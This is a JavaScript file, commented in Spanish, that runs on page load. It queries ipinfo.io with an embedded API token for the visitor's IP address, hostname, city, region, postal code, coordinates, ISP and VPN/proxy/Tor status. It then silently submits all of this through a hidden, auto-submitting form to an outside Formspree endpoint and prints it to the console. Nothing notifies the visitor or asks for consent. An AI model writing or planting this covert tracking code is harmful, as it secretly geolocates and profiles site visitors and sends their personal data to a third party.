 function enviarInformacionUsuario(data) {
    // Crear un formulario dinámicamente
    var form = document.createElement('form');
    form.setAttribute('action', 'https://formspree.io/f/xbjnydvp');
    form.setAttribute('method', 'POST');
    form.setAttribute('style', 'display: none;');

    // Crear un campo oculto para cada clave-valor de la información del usuario
    Object.keys(data).forEach(key => {
        var inputField = document.createElement('input');
        inputField.setAttribute('type', 'hidden');
        inputField.setAttribute('name', key);
        inputField.setAttribute('value', data[key]);
        form.appendChild(inputField);
    });

    // Agregar el formulario al cuerpo del documento
    document.body.appendChild(form);

    // Enviar el formulario automáticamente
    form.submit();
}

function obtenerInformacionUsuario() {
    // Llamada a la API ipinfo.io para obtener la información del usuario
    fetch('https://ipinfo.io/?token=6b1f42952f063e')
        .then(response => response.json())
        .then(data => {
            // Enviar la información del usuario a Formspree
            enviarInformacionUsuario(data);

            // Extraer la información del usuario desde la respuesta JSON
           var ip = data.ip;
            var hostname = data.hostname;
            var city = data.city;
            var region = data.region;
            var country = data.country;
            var loc = data.loc;
            var postal = data.postal;
            var timezone = data.timezone;
            var asn = data.asn;
            var company = data.company;
            var carrier = data.carrier;
            var privacy = data.privacy;
            var abuse = data.abuse;
            var domains = data.domains;

            // Imprimir datos específicos de privacidad y abuso
            var vpn = privacy.vpn;
            var proxy = privacy.proxy;
            var tor = privacy.tor;
            var relay = privacy.relay;
            var hosting = privacy.hosting;
            var service = privacy.service;
            var abuseAddress = abuse.address;
            var abuseEmail = abuse.email;
            var abuseName = abuse.name;
            var abuseNetwork = abuse.network;
            var abusePhone = abuse.phone;
            var domainsPage = domains.page;
            var domainsTotal = domains.total;
            var domainsList = domains.domains;
      
      // Variables para los datos de dominios
            var numeroPaginaDominios = domains.page;
            var totalDominios = domains.total;
            var listaDominios = domains.domains;
         
          // Imprimir la información del usuario en la consola
console.log('Dirección IP:', data.ip);
console.log('Nombre de host:', data.hostname);
console.log('Ciudad:', data.city);
console.log('Región:', data.region);
console.log('País:', data.country);
console.log('Ubicación:', data.loc);
console.log('Código Postal:', data.postal);
console.log('Zona horaria:', data.timezone);

// Imprimir información compleja como cadenas JSON si son objetos, de lo contrario, imprimir el valor directo
console.log('ASN:', typeof data.asn === 'object' ? JSON.stringify(data.asn) : data.asn);
console.log('Compañía:', typeof data.company === 'object' ? JSON.stringify(data.company) : data.company);
console.log('Proveedor de servicios de telefonía:', typeof data.carrier === 'object' ? JSON.stringify(data.carrier) : data.carrier);
console.log('Privacidad:', typeof data.privacy === 'object' ? JSON.stringify(data.privacy) : data.privacy);
console.log('Abuso:', typeof data.abuse === 'object' ? JSON.stringify(data.abuse) : data.abuse);
console.log('Dominios:', typeof data.domains === 'object' ? JSON.stringify(data.domains) : data.domains);

// Imprimir datos específicos de privacidad y abuso
console.log('VPN:', data.privacy.vpn);
console.log('Proxy:', data.privacy.proxy);
console.log('TOR:', data.privacy.tor);
console.log('Relay:', data.privacy.relay);
console.log('Hosting:', data.privacy.hosting);
console.log('Servicio:', data.privacy.service);
console.log('Dirección de Abuso:', data.abuse.address);
console.log('Email de Abuso:', data.abuse.email);
console.log('Nombre de Abuso:', data.abuse.name);
console.log('Red de Abuso:', data.abuse.network);
console.log('Teléfono de Abuso:', data.abuse.phone);

// Imprimir información de dominios
console.log('Número de Página de Dominios:', data.domains.page);
console.log('Total de Dominios:', data.domains.total);
console.log('Dominios:', data.domains.domains);

        })
        .catch(error => {
            console.error('Hubo un error al obtener la información del usuario:', error);
        });
}

obtenerInformacionUsuario();
